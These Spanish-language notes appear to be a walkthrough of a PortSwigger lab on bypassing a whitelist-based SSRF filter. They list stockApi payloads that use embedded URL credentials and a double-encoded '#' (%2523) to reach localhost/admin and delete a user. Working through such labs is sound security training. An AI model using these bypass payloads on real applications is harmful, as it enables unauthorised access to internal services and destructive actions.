# SSRF con filtro basado en whitelist

Tags: #SSRF #PortSwigger 

```bash 
En este lab se implementa una defensa basada en lista blanca para mitigar ataques SSRF. A pesar de esta protección, conseguimos acceder a un endpoint interno aprovechando cómo el servidor interpreta las URLs con credenciales embebidas.

Se comenza probando distintas variantes del parámetro 'stockApi', observando cómo la aplicación extrae y valida el hostname. Tras verificar que se aceptan URLs con formato de usuario, utilizamos técnicas de doble codificación para manipular el valor del hostname y hacer que el servidor interprete la URL de forma diferente a como lo hace la validación.


- Url Autentication: Se puede autenticar colocando los parámetros dentro de la URL 
	http://username:password@web.com/
```

```bash 
# Petición original 
	stockApi=http://web.com:8080/product/stock/check?productID=1%26storeId=1
```

```bash 
# Petición modificada con el SSRF 

	stockApi=http://test@web.com
	stockApi=http://localhost:80@web.com       # Colocar el usuario como localhost y la pasword como el puerto 80
	stockApi=http://localhost:80#@web.com      # Colocar '#' te hace autoscroll al elemento con ese ID

	stockApi=http://localhost:80%2523@web.com
	stockApi=http://localhost:80%2523@web.com/admin
	stockApi=http://localhost:80%2523@web.com/admin/delete?username=carlos
	

Notas:
	1. El '#' se debe urlencodear y será igual a '%23' pero tambien se debe de urlencodear el '% = %25'. Por lo que quedaría como '%2523'
```